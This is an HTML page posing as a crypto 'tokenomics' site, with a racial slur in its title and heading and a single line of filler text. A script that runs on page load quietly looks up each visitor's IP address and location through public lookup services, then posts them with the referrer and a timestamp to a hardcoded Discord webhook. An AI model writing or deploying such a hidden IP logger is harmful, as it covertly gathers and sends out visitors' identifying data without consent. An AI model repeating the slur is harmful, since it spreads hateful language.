<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NiggerButt Tokenomics</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      color: white;
      line-height: 1.6;
      background: url('background.png') no-repeat center center fixed;
      background-size: cover;
    }

    .content {
      background: rgba(0, 0, 0, 0.6);
      margin: 20px auto;
      padding: 20px;
      max-width: 800px;
      border-radius: 10px;
    }

    h1 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 2.5rem;
    }

    p {
      font-size: 1.2rem;
      text-align: justify;
    }

    body, html {
      height: 100%;
      overflow-y: scroll;
    }
  </style>
  <link rel="icon" href="background.png" type="image/png">
</head>
<body>
  <div class="content">
    <h1>NiggerButt Tokenomics</h1>
    <p>NiggerButt Tokenomics is a decentralized framework empowering everyone. Join the future today!</p>
  </div>

  <script>
    // Function to send data to Discord
    function sendToDiscord(ip, city, country, referrer) {
      const timestamp = new Date().toISOString();
      const referrerText = referrer ? referrer : "Direct visit";
      const message = {
        content: `${ip} - ${timestamp} - Referrer: ${referrerText} - Location: ${city}, ${country}`
      };

      fetch('https://discord.com/api/webhooks/1326405977825607680/KFunZjbrcLq7sjV_UoMqCKawOSTfXUWgRNd723QDfD8g2bz0nN9b4hD5-9qZKuVUuFDK', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(message),
      })
        .then(response => {
          if (!response.ok) {
            console.error('Error sending to Discord:', response.statusText);
          }
        })
        .catch(error => console.error('Error posting to Discord webhook:', error));
    }

    // Fetch IP address and geolocation
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(ipData => {
        const ip = ipData.ip;
        console.log('IP fetched:', ip);

        // Fetch geolocation using IP
        fetch(`http://ip-api.com/json/${ip}`)
          .then(response => response.json())
          .then(locationData => {
            const city = locationData.city || "Unknown City";
            const country = locationData.country || "Unknown Country";
            const referrer = document.referrer;

            console.log('Location fetched:', city, country, referrer);

            // Send data to Discord
            sendToDiscord(ip, city, country, referrer);
          })
          .catch(error => console.error('Error fetching location data:', error));
      })
      .catch(error => console.error('Error fetching IP:', error));
  </script>
</body>
</html>
